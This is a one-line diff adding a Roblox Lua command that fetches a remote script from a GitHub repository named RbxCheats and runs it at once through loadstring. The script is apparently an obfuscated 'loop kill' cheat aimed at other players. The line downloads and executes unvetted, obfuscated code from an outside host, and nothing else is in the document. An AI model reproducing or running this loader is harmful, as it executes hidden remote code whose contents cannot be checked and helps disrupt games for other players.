@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RbxCheats/RbxCheats/master/Scripts/PL%20Loop%20Kill%20Obfuscated%20.lua",true))()
